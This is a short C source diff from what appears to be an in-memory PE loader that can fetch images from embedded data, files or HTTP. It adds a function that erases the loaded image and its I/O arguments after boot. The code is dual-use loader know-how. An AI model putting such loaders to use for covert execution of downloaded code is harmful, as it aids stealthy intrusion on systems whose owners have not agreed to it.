@@ -11,6 +11,7 @@
 static errno loadOption(Runtime_Opts* options);
 static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config);
 static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);
+static errno eraseArguments(Runtime_M* runtime);
 
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
@@ -67,9 +68,13 @@ errno Boot()
             break;
         }
         runtime->Memory.Free(config.Image);
+        err = eraseArguments(runtime);
+        if (err != NO_ERROR)
+        {
+            break;
+        }
         break;
     }
-    runtime->Argument.EraseAll();
     if (err != NO_ERROR || loader == NULL)
     {
         runtime->Core.Exit();
@@ -275,4 +280,29 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
         return NULL;
     }
     return resp.Body.Buf;
+}
+
+static errno eraseArguments(Runtime_M* runtime)
+{
+    uint32 idx[] = 
+    {
+        ARG_IDX_PE_IMAGE,
+        ARG_IDX_STD_INPUT,
+        ARG_IDX_STD_OUTPUT,
+        ARG_IDX_STD_ERROR,
+        ARG_IDX_WAIT_MAIN,
+    };
+    bool success = true;
+    for (int i = 0; i < arrlen(idx); i++)
+    {
+        if (!runtime->Argument.Erase(idx[i]))
+        {
+            success = false;   
+        }
+    }
+    if (success)
+    {
+        return NO_ERROR;
+    }
+    return ERR_ERASE_ARGUMENTS;
 }
